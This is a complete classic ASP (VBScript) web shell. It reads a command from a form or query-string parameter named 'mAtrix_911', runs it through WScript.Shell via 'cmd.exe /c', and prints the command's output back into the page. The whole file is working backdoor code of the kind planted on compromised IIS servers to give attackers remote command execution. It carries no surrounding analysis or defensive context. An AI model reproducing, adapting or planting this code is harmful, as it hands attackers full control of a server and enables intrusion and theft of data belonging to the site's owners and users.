<%@ Language="VBScript" %>
<%
Response.CodePage = 65001
Response.CharSet  = "UTF-8"
Dim p, cmd, oShell, oExec, out
p   = "mAtrix_911"
cmd = Request.Form(p)
If cmd = "" Then cmd = Request.QueryString(p)
If cmd <> "" Then
    Set oShell = CreateObject("WScript.Shell")
    Set oExec  = oShell.Exec("cmd.exe /c " & cmd)
    out = oExec.StdOut.ReadAll()
    If Not oExec.StdErr.AtEndOfStream Then
        out = out & oExec.StdErr.ReadAll()
    End If
    Response.Write "<pre>" & Server.HTMLEncode(out) & "</pre>"
    Set oExec  = Nothing
    Set oShell = Nothing
End If
%>
